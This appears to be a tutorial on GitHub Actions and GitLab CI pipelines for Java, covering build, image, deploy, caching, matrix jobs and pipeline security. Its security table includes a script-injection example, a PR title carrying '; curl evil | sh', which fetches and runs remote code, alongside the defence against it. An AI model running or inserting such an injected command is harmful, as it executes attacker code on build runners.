0. What a hosted CI pipeline is (and how it differs from Jenkins)

GitHub Actions and GitLab CI run your build steps on fresh virtual machines or containers every time something happens in the repo (push, pull request, tag, schedule, button). The pipeline is a YAML file in the repo, so it is versioned and reviewed like code. There is no server to install: the platform hosts the control plane and (optionally) the machines.

#What happens on a push
1GitHub reads every workflow whose on: matches the event (branch, path filters).
2For each job, a runner is assigned; a fresh VM boots with a pre-installed toolset (Java, Docker, Node, etc.).
3Steps run in order: actions/checkout clones the repo, then your commands. Each step's exit code decides pass/fail.
4Jobs that needs: others wait for them; outputs and artifacts flow between jobs; caches are restored/saved.
5Status is reported back to the commit/PR as a check; required checks block merging; environments gate deploys.
Mental model: every job is a brand-new laptop handed to a robot with your checklist. The robot has nothing from last time — no repo, no jars, no login. Whatever you want it to have, you must fetch (checkout), restore (cache), download (artifact), or inject (secret) at the start, and anything you want to keep you must upload before the laptop is wiped.
Q. Job A builds target/app.jar. Job B runs java -jar target/app.jar and fails with "file not found". Why?
Reveal hint
Different jobs = different machines. B never had A's files. Upload the jar as an artifact in A (actions/upload-artifact) and download it in B, or do both in one job.

1. Workflow anatomy — every key you will use

name: CI                                          # shown in the Actions tab
run-name: CI for ${{ github.ref_name }} by @${{ github.actor }}

on:                                               # triggers (Section 2)
  push: { branches: [main], tags: ['v*'] }
  pull_request: { branches: [main] }

permissions:                                      # least privilege for the GITHUB_TOKEN (default is too broad)
  contents: read

concurrency:                                      # cancel the previous run of the same PR when a new push arrives
  group: ci-${{ github.ref }}
  cancel-in-progress: true

env:                                              # workflow-wide env vars (also allowed per job / per step)
  MAVEN_OPTS: -Dmaven.repo.local=${{ github.workspace }}/.m2

defaults:
  run: { shell: bash }                           # bash with -eo pipefail semantics on every run step

jobs:
  build:                                          # job id (used in needs:)
    name: Build & test                            # display name
    runs-on: ubuntu-latest                        # runner label; also ubuntu-24.04, windows-latest, macos-latest, [self-hosted, linux]
    timeout-minutes: 20                           # default is 360 — always set it
    if: github.event_name != 'pull_request' || !github.event.pull_request.draft
    outputs:
      version: ${{ steps.ver.outputs.version }}   # expose a step output to other jobs
    services:                                     # sidecar containers for the job (DB for integration tests)
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        ports: ["5432:5432"]
        options: --health-cmd pg_isready --health-interval 5s --health-retries 10
    steps:
      - uses: actions/checkout@v4                 # a step that runs an action
        with: { fetch-depth: 0 }                   # full history (tags for versioning); default 1 = shallow
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 21, cache: maven }
      - name: Compute version                     # a step that runs a shell command
        id: ver
        run: echo "version=$(git describe --tags --always)" >> "$GITHUB_OUTPUT"
      - name: Build
        run: ./mvnw -B -ntp verify
        env: { DB_URL: jdbc:postgresql://localhost:5432/postgres }
      - name: Test report
        if: always()                                # run even when a previous step failed
        uses: dorny/test-reporter@v1
        with: { name: JUnit, path: '**/target/surefire-reports/*.xml', reporter: java-junit }
      - uses: actions/upload-artifact@v4
        with: { name: app-jar, path: target/*.jar, retention-days: 7 }

  deploy:
    needs: build                                  # dependency; runs after build succeeds
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production                       # gates + environment secrets
    steps:
      - uses: actions/download-artifact@v4
        with: { name: app-jar, path: dist }
      - run: echo "deploying ${{ needs.build.outputs.version }}"

No timeoutA hung test holds a runner for 6 hours and burns minutes.timeout-minutes on every job.
No concurrency groupFive pushes to a PR = five full runs.concurrency with cancel-in-progress: true for CI (not for deploys).

Q. A run step does export VERSION=1.2. The next step echoes $VERSION and gets nothing. Why?
Reveal hint
Each step is a new shell process. Write to the env file instead: echo "VERSION=1.2" >> "$GITHUB_ENV" — later steps in the same job see it. For other jobs, use outputs.

Q. Your PR workflow checks out the code. Is it the PR branch's commit?
Reveal hint
By default no — pull_request checks out refs/pull/N/merge, a temporary merge of the PR into the base branch. That is what you want for testing "what main will look like". For the raw head use ref: ${{ github.event.pull_request.head.sha }}.

3. A complete Java pipeline — build, test, image, deploy

name: shop-api
on:
  push: { branches: [main], tags: ['v*'] }
  pull_request:
permissions: { contents: read }
concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: ${{ github.event_name == 'pull_request' }} }

env:
  IMAGE: ghcr.io/${{ github.repository }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 21, cache: maven }
      - name: Unit + integration tests (Testcontainers uses the runner's Docker)
        run: ./mvnw -B -ntp verify
      - name: Publish test results
        if: always()
        uses: mikepenz/action-junit-report@v5
        with: { report_paths: '**/target/*-reports/TEST-*.xml' }
      - name: Coverage to summary
        if: always()
        run: |
          echo "## Coverage" >> "$GITHUB_STEP_SUMMARY"
          grep -o 'Total[^%]*%' target/site/jacoco/index.html | head -1 >> "$GITHUB_STEP_SUMMARY" || true
      - uses: actions/upload-artifact@v4
        with: { name: jar, path: target/*.jar, if-no-files-found: error }

  image:
    needs: test
    if: github.event_name == 'push'                     # main and tags only, not PRs
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write, id-token: write }
    outputs: { tag: ${{ steps.meta.outputs.version }}, digest: ${{ steps.push.outputs.digest }} }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { name: jar, path: target }
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: ${{ github.actor }}, password: ${{ secrets.GITHUB_TOKEN }} }
      - id: meta
        uses: docker/metadata-action@v5                  # tags: sha-<short>, main, v1.4.0, 1.4, latest
        with:
          images: ${{ env.IMAGE }}
          tags: |
            type=sha
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha                         # layer cache in GitHub's cache
          cache-to: type=gha,mode=max
          provenance: true
      - name: Scan image
        uses: aquasecurity/trivy-action@0.28.0
        with: { image-ref: ${{ env.IMAGE }}@${{ steps.push.outputs.digest }}, severity: CRITICAL,HIGH, exit-code: '1', ignore-unfixed: true }
      - name: Sign image (keyless, OIDC)
        uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes "${IMAGE}@${{ steps.push.outputs.digest }}"

  deploy-staging:
    needs: image
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: { name: staging, url: https://staging.shop.example }
    permissions: { id-token: write, contents: read }
    steps:
      - uses: aws-actions/configure-aws-credentials@v4     # OIDC: no stored AWS keys (Section 5)
        with: { role-to-assume: arn:aws:iam::123456789012:role/gha-shop-deploy, aws-region: ap-south-1 }
      - run: aws eks update-kubeconfig --name shop-staging
      - run: |
          kubectl set image deploy/api api="${IMAGE}@${{ needs.image.outputs.digest }}" -n shop
          kubectl rollout status deploy/api -n shop --timeout=180s

  deploy-prod:
    needs: [image, deploy-staging]
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    environment: production                          # required reviewers + wait timer configured in repo settings
    concurrency: { group: prod-deploy, cancel-in-progress: false }   # never cancel a prod deploy; queue instead
    steps:
      - run: echo "deploy ${{ needs.image.outputs.digest }} to prod"   # or: bump the tag in the GitOps repo and let Argo CD roll it out
Design choice in this pipelineWhy
Build once, promote the same digestStaging and prod run byte-identical images. Tags can move; a digest cannot.
PRs stop after testNo images or deploys from untrusted or unfinished code; saves minutes.
Image only from push; prod only from tagsClear, auditable promotion rule; tags are release decisions.
Scan + sign before deploySupply-chain hygiene; admission controllers can require signatures.
environment: on deploy jobsApproval gates, deployment history, environment-scoped secrets.
OIDC to the cloudNo long-lived cloud keys stored in GitHub.
GitOps alternativeInstead of kubectl from CI, commit the new digest to a config repo; Argo CD / Flux apply it. CI then needs no cluster credentials at all.
TopicWrongRight
Rebuild per environmentStaging builds its jar; prod builds another from the same commit "to be safe".One artifact, promoted. Two builds are never guaranteed identical.
Deploy :latestkubectl set image api=ghcr.io/shop/api:latest — what version is running? Nobody knows.Deploy by digest (or an immutable version tag).
Cluster admin kubeconfig as a secretA long-lived kubeconfig with full rights stored in repo secrets.OIDC → short-lived cloud role scoped to one namespace; or GitOps so CI never touches the cluster.
Cancelling deployscancel-in-progress: true on the prod job → a half-finished rollout.Cancel CI runs; queue deploys.
Tests only on mainPRs skip integration tests "for speed", main goes red after merge.Full verify on PRs; Testcontainers works on hosted runners (Docker is present).
Q. Why download the jar artifact in the image job instead of just re-running mvn package?
Reveal hint
Two reasons: speed (no second compile), and provenance — the image contains exactly the bytes the tests ran against. A second build might pull a newer snapshot or a different plugin version and silently differ.

4. Caching, artifacts, matrix builds

MechanismWhat it is forLifetime / limits
Cache (actions/cache, or cache: in setup-java/setup-node)Speed: dependency stores (~/.m2, ~/.gradle), Docker layers. Keyed by a hash; best effort — a miss must not break the build.10 GB per repo, evicted after 7 days unused; branch-scoped (PR can read main's cache, not vice versa).
Artifact (upload-artifact / download-artifact)Pass files between jobs; keep build outputs and reports for humans to download.Per run; default 90 days (set retention-days). Zipped; v4 artifacts are immutable per name.
Packages / ReleasesPublish jars (GitHub Packages Maven), images (ghcr.io), release binaries.Permanent.
 
# explicit cache (when setup-java's built-in isn't enough, e.g. custom repo dir)
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: maven-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}     # exact hit when no POM changed
    restore-keys: |
      maven-${{ runner.os }}-                                      # partial hit: most jars still reused
# Gradle: just use gradle/actions/setup-gradle@v4 — caches, read-only on PRs, cleans stale entries

# matrix: run the same job across versions / OSes
jobs:
  test:
    strategy:
      fail-fast: false                        # let all combos finish so you see every failure
      max-parallel: 4
      matrix:
        java: [17, 21]
        os: [ubuntu-latest, windows-latest]
        include:
          - { java: 23, os: ubuntu-latest, experimental: true }
        exclude:
          - { java: 17, os: windows-latest }
    runs-on: ${{ matrix.os }}
    continue-on-error: ${{ matrix.experimental == true }}
    name: test (java ${{ matrix.java }}, ${{ matrix.os }})
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: ${{ matrix.java }}, cache: maven }
      - run: ./mvnw -B -ntp verify

# dynamic matrix from a previous job (e.g. changed services in a monorepo)
  detect:
    outputs: { services: ${{ steps.set.outputs.services }} }
    steps:
      - id: set
        run: echo 'services=["orders","payments"]' >> "$GITHUB_OUTPUT"
  build:
    needs: detect
    strategy: { matrix: { service: ${{ fromJSON(needs.detect.outputs.services) }} } }
    steps: [ { run: ./mvnw -pl services/${{ matrix.service }} -am verify } ]

Q. The PR's cache restore says "Cache not found" even though main just saved one with the same key. Why?
Reveal hint
Cache scope: a PR branch can read caches from its base branch (main) and itself, but main cannot read PR caches, and PR branches cannot read each other. Also the key includes runner.os — a Windows job never hits an Ubuntu cache. Check the exact key in the logs.

Q. How does OIDC let a workflow get AWS credentials without any secret stored anywhere?
Reveal hint
GitHub signs a short-lived JWT describing the run (repo, branch/tag, environment, actor). AWS trusts GitHub's public keys (the identity provider you registered) and, if the token's claims match the role's trust policy, STS hands back temporary credentials. Nothing to store, nothing to rotate, and the role can be limited to repo:shop/api:environment:production.

# .github/actions/setup-java-maven/action.yml  (composite action)
name: Setup Java + Maven
inputs:
  java-version: { default: '21' }
runs:
  using: composite
  steps:
    - uses: actions/setup-java@v4
      with: { distribution: temurin, java-version: ${{ inputs.java-version }}, cache: maven }
    - run: ./mvnw -v
      shell: bash                                  # shell is REQUIRED in composite run steps

# .github/workflows/java-ci.yml in repo shop/workflows  (reusable workflow)
on:

    inputs:
      java-version: { type: string, default: '21' }

Nesting too deepReusable → reusable → reusable → composite.Max 4 levels allowed; keep it to 2. Debugging nested YAML is painful.
Secrets not passedReusable workflow fails with empty secrets.X.Caller must pass secrets: inherit or each secret by name; declare them under workflow_call.secrets.
Q. In a reusable workflow, which repo does actions/checkout check out — the caller's or the shared workflow's?
Reveal hint
The caller's. Reusable workflows run in the caller's context (github.repository, token, secrets); only the YAML comes from the shared repo. Files from the shared repo (scripts) are not present — reference them via a composite action or check out the shared repo explicitly.

Q. Testcontainers in a container: job fails with "Could not find a valid Docker environment". On a plain job it works. Why?
Reveal hint
Inside the job container there is no Docker socket. Either run Testcontainers on the plain runner (recommended — Docker is on the host), mount the socket (options: -v /var/run/docker.sock:/var/run/docker.sock) and set TESTCONTAINERS_HOST_OVERRIDE, or use services: for the databases instead.

Q. In GitLab, the image job has needs: [test] and is in a later stage. The lint job in the test stage is still running. Does image wait for lint?
Reveal hint
No. needs turns the pipeline into a DAG: image starts as soon as test succeeds, ignoring the rest of the stage. Without needs, it would wait for the whole test stage. That is how you cut pipeline time on GitLab.

9. Security of the pipeline itself

RiskHow it bitesDefence
Script injectionrun: echo "${{ github.event.pull_request.title }}" — a PR titled "; curl evil | sh; echo " executes on your runner.Never put untrusted context (github.event.* titles, bodies, branch names, commit messages) directly in run. Pass through env: and quote: env: { T: ${{ github.event.pull_request.title }} } then echo "$T".
Compromised third-party actionuses: someone/action@v1 where v1 is moved to malicious code (it happened: tj-actions, 2025).Pin third-party actions to a full commit SHA with a version comment; allow-list actions at the org level; Dependabot keeps SHAs fresh.
Over-privileged GITHUB_TOKENA step (or injected code) pushes commits, edits releases, or writes packages.permissions: contents: read default; grant per job; org setting "read-only by default".
pull_request_target misuseChecking out and building fork code with secrets available.Only use it for metadata actions; never checkout the PR head there.
Secrets in logs / artifactsDebug output, set -x, heap dumps in artifacts.No set -x with secrets; add-mask; review artifact contents; secret scanning on the repo.
Cache poisoningA PR writes a tampered dependency into a cache that main later restores.Caches are branch-isolated by design; keep it that way (do not share caches via workarounds); verify checksums (Gradle dependency verification, Maven Central checksums).
Persistent self-hosted runnersResidue from one job (credentials, malware) affects the next.Ephemeral runners; separate runner pools for prod deploys.
Supply chain of your artifactNobody can prove the image came from this pipeline and this commit.SBOM (anchore/sbom-action, cyclonedx-maven-plugin), provenance attestations (actions/attest-build-provenance, SLSA), cosign signatures, admission policy that checks them.

Q. Is uses: actions/checkout@v4 (a major tag from GitHub itself) safe enough?
Reveal hint

The 7 rules to remember: 1) every job is a fresh machine — checkout, cache, artifact, secret explicitly; 2) permissions, timeout-minutes, concurrency on everything; 3) PRs build and test, pushes to main build images, tags deploy to prod — one artifact promoted by digest; 4) OIDC + environments for deploys; 5) pin actions, treat github.event.* as hostile; 6) cache dependencies, not outputs; artifacts between jobs; 7) one reusable workflow per stack, called by every repo.
Q. Interviewer: "GitHub Actions or Jenkins?"
Reveal hint
Hosted CI (Actions/GitLab) when the code already lives there: zero servers, YAML in the repo, marketplace, OIDC — the default for new work. Jenkins when you need things hosted CI cannot do: on-prem data that cannot leave, exotic build farms, heavy plugin-based legacy, or thousands of jobs where per-minute pricing hurts. Many companies run both; the concepts (stages, artifacts, agents, secrets, gates) are identical.
